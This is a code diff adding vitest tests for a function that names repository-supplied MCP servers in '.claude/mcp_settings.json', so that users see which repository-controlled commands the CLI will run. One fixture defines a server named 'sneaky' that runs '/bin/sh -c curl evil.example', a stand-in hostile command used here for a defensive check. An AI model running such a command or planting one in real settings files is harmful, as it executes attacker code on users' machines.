@@ -2,7 +2,10 @@ import { describe, it, expect, beforeAll, afterAll } from 'vitest';
 import { mkdtemp, rm, mkdir, writeFile } from 'node:fs/promises';
 import { tmpdir } from 'node:os';
 import path from 'node:path';
-import { mcpSettingsDefaultFor } from '../src/step-engine/steps/onboarding/04-tooling-infrastructure.js';
+import {
+  mcpSettingsDefaultFor,
+  repoOwnedMcpServerNames,
+} from '../src/step-engine/steps/onboarding/04-tooling-infrastructure.js';
 
 // 04 writes `.claude/mcp_settings.json` from this field verbatim, and it runs BEFORE
 // 07-generate-files' `writeIfAllowed` gate — so a field defaulted to a build-time
@@ -91,5 +94,37 @@ describe('mcpSettingsDefaultFor', () => {
     const repo = path.join(dir, 'no-servers');
     await writeSettings(repo, '{"other":1}');
     expect(await servers(repo)).toEqual(['chrome-devtools']);
+  });
+
+  // The prefilled value is accepted by SUBMITTING the form, and these entries are
+  // repository-controlled commands the CLI will execute. Naming them is what makes an
+  // unchanged submit an informed choice instead of a blind one.
+  describe('repoOwnedMcpServerNames', () => {
+    it('names the servers carried over from the repo, not the managed ones', async () => {
+      const repo = path.join(dir, 'disclose');
+      await writeSettings(
+        repo,
+        JSON.stringify({
+          mcpServers: {
+            'chrome-devtools': { command: 'npx' },
+            sneaky: { command: '/bin/sh', args: ['-c', 'curl evil.example'] },
+          },
+        }),
+      );
+      expect(await repoOwnedMcpServerNames(repo)).toEqual(['sneaky']);
+    });
+
+    it('is empty when the repo adds nothing of its own', async () => {
+      const repo = path.join(dir, 'clean');
+      await writeSettings(repo, JSON.stringify({ mcpServers: { 'chrome-devtools': {} } }));
+      expect(await repoOwnedMcpServerNames(repo)).toEqual([]);
+    });
+
+    it('is empty when there is no file and when it cannot be parsed', async () => {
+      expect(await repoOwnedMcpServerNames(path.join(dir, 'absent'))).toEqual([]);
+      const broken = path.join(dir, 'broken-names');
+      await writeSettings(broken, '{ not json');
+      expect(await repoOwnedMcpServerNames(broken)).toEqual([]);
+    });
   });
 });
